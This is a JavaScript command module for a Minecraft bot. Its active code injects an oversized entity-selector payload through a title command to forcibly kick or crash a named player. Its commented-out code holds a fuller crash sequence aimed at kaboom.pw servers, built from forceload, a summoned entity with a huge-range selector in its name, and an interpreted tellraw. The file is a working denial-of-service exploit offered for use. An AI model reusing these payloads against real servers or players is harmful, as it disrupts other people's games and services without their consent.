module.exports={
  command:(bot,cmd,uuid,things)=>{
//    if(!uuid.includes("-")){
    //  let i=+cmd.split(" ")[1]
  //      let dval=Date.now()+""
//        bot.chatmsg("&aCrashing server "+i+" ("+things.bots[i].host+")")
       // things.bots[i].ccrun("/forceload add ~ ~ ~ ~")
//        things.bots[i].ccrun("/execute as 7fffffff-7fff-ffff-7fff-ffff7fffffff run kill @s")
  //      things.bots[i].ccrun("/data remove storage a a")
    //    things.bots[i].ccrun(`/summon cat ~ ~ ~ {UUID:[I;2147483647,2147483647,2147483647,2147483647],NoAI:1b,CustomName:'{"selector":"@e[dist\\\\u0061nce=1..999999999]"}',CustomNameVisible:1b}`)
        bot.ccrun("/data modify storage x x set value \"["+Array(50).fill('{\\"selector\\":\\"@e\\"}')+"]\"")
        bot.ccrun('/execute as '+cmd.split(" ")[1]+' run title @s title {"nbt":"x","storage":"x","interpret":true}')
        bot.chatmsg("Kicking player "+cmd.split(" ")[1])
      return
/*  }  
    for(let i in things.bots){
      //if(!uuid.includes("-")) i=+cmd.split(" ")[1]
      if(things.bots[i].host.includes("kaboom.pw")){
        let dval=Date.now()+""
        bot.chatmsg("&aCrashing server "+i+" ("+things.bots[i].host+")")
        things.bots[i].ccrun("/forceload add ~ ~ ~ ~")
        things.bots[i].ccrun("/execute as 7fffffff-7fff-ffff-7fff-ffff7fffffff run kill @s")
        things.bots[i].ccrun("/data remove storage a a")
        things.bots[i].ccrun(`/summon cat ~ ~ ~ {UUID:[I;2147483647,2147483647,2147483647,2147483647],NoAI:1b,CustomName:'{"selector":"@e[dist\\\\u0061nce=1..999999999]"}',CustomNameVisible:1b}`)
        things.bots[i].ccrun("/data modify storage a a set from entity 7fffffff-7fff-ffff-7fff-ffff7fffffff CustomName")
        things.bots[i].ccrun('/tellraw @a {"nbt":"a","storage":"a","interpret":true}')
      }
      //if(!uuid.includes("-")) break
    }*/
  }
}
